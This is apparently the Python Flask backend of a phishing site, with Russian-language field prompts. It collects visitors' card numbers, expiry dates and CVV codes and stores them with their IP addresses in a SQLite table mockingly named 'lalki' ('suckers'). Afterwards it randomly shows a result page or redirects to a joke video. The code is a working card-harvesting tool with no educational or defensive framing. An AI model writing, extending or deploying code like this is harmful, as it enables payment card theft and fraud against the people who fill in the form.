from flask import Flask, render_template, request, session, redirect
import random
import sqlite3  
app = Flask(__name__)
app.secret_key = 'some secret key' 

@app.route('/')
def mainPage():
    return render_template('index.html')

@app.route('/result')
def result():
    if 'cardinfo' not in session:
        return redirect('/')
    if random.randint(1,10) > 3:
        return render_template('result.html')
    else:
        return redirect('https://www.youtube.com/watch?v=dQw4w9WgXcQ')

@app.route('/writedown')
def writeInfo():
    connection = sqlite3.connect('db.sqlite')
    cursor = connection.cursor()
    number = request.args['number'] 
    date = request.args['date']
    code = request.args['code']
    if  number == None or number == 'Введите номер карты' or date==None or date == 'Введите срок действия' or code==None or code=='Введите CVV/CVC код':
        return render_template('index.html', number=number,date=date,code=code,error='Поля заполены некорректно')

    cursor.execute('INSERT INTO lalki (ip, number, date, code) VALUES (?,?,?,?)',(request.remote_addr,number,date,code,))
    connection.commit()
    session['cardinfo'] = 'True'
    return redirect('/result')

# @app.route('/addpost')
# def addpost():
        

if __name__ == "__main__":
    app.run(debug=True, host = '0.0.0.0', port = 1488)
